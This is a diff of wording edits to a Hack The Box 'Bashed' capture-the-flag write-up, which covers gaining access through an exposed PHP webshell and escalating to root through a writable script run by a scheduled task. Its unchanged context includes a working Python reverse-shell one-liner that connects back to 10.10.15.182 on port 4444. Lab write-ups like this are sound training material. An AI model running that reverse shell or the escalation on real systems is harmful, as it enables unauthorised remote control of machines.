@@ -18,7 +18,7 @@
 
 ## 📖 Introduction
 
-This writeup documents the exploitation process of the Hack The Box **Bashed** machine, a Linux target exposing a web-based shell through an accessible exposed directory.
+This writeup documents the exploitation process of the Hack The Box **Bashed** machine, a Linux target exposing a web-based shell through an accessible directory.
 
 The objective of this challenge was to identify exposed web content, gain initial access through the discovered PHP webshell, and escalate privileges to achieve full system compromise.
 
@@ -108,7 +108,7 @@ A Python reverse shell was then executed through the webshell:
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.182",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
 ```
 
-This resulted in an interactive shell as the `www-data` user.
+This resulted in an interactive reverse shell running as the www-data user.
 
 
 ---
@@ -181,7 +181,7 @@ Inside the directory, a Python script named `test.py` was discovered:
 
 File permissions revealed that the `scriptmanager` user had write access to the script.
 
-Additionally, monitoring system behavior and enumerating scheduled processes suggested that the script was being executed automatically by the `root` user through a recurring task mechanism through a recurring scheduled task mechanism.
+Additionally, monitoring system behavior and enumerating scheduled processes suggested that the script was being executed automatically by the `root` user through a recurring scheduled task mechanism.
 
 This created a privilege escalation opportunity, since modifying the contents of `test.py` would result in arbitrary code execution as `root`.
 
